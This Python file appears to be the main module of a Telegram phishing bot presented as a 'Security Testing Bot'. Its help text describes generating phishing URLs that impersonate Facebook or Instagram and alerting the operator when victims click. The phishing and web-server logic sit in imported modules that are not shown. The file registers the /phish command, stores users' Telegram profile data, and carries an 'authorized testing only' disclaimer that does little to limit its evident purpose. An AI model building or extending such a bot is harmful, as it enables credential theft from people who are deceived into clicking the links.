import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import json
import os
from const import BOT_TOKEN, USER_DATA_FILE
from phish import start_phishing, get_stats
# ✅ Import web server
from webserver import start_server
# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)  # ✅ FIXED: Added underscores

def ensure_user_data_file():
    """Ensure user_data.json exists with proper structure"""
    if not os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'w') as f:
            json.dump({"users": {}}, f, indent=2)

def save_user_data(update: Update):
    """Save user data when they start the bot"""
    try:
        user = update.effective_user
        with open(USER_DATA_FILE, 'r') as f:
            data = json.load(f)
        
        user_id_str = str(user.id)
        if user_id_str not in data["users"]:
            data["users"][user_id_str] = {
                "user_id": user.id,
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "is_bot": user.is_bot,
                "language_code": user.language_code,
                "start_time": update.message.date.isoformat() if update.message else None,
                "last_activity": None,
                "phishing_attacks": [],
                "click_data": []
            }
        else:
            # Update existing user data
            data["users"][user_id_str].update({
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "last_activity": update.message.date.isoformat() if update.message else None
            })
        
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
            
        logger.info(f"Saved data for user: {user.username} (ID: {user.id})")
        
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message when user starts the bot"""
    save_user_data(update)
    
    welcome_text = """
🤖 Welcome to the Security Testing Bot!

Available commands:
/start - Show this welcome message
/phish <target> - Start phishing simulation for specified target
/stats - Show your phishing statistics
/help - Show help information

⚠️ Note: This bot is for educational and authorized security testing only.
    """
    
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help information"""
    help_text = """
🛡️ Security Testing Bot Help

Commands:
/phish <target> - Start a phishing simulation
  Example: /phish facebook
  Example: /phish instagram

/stats - View your attack statistics

📝 Usage:
1. Use /phish followed by the target name
2. The bot will generate a phishing URL
3. You'll receive notifications when someone clicks the link

🔒 Privacy: All your data is stored securely and only used for your testing sessions.
    """
    
    await update.message.reply_text(help_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    save_user_data(update)
    await update.message.reply_text(
        "I see you sent a message! Use /help to see available commands."
    )

def main():
    """Start the bot"""
    # Ensure user data file exists
    ensure_user_data_file()
    
    # Web server starts automatically when imported
    logger.info("Starting web server for real websites...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()

# Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("phish", start_phishing))
    application.add_handler(CommandHandler("stats", get_stats))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the Bot
    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':  # ✅ FIXED: Added underscores
    main()
